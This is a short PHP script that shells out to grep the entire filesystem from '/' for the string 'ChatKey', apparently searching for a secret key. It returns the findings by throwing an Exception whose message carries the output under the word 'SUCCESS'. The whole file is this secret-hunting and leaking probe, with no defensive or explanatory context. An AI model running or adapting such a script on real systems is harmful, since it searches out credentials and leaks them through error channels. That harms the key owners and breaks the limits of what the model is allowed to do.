<?php
$output ='';

$output =$output."\n find  *bad* with cat".shell_exec ("grep -rnw '/' -e '*ChatKey*' | cat");

throw new Exception("\n SUCCESS  ". $output."\n");
?>
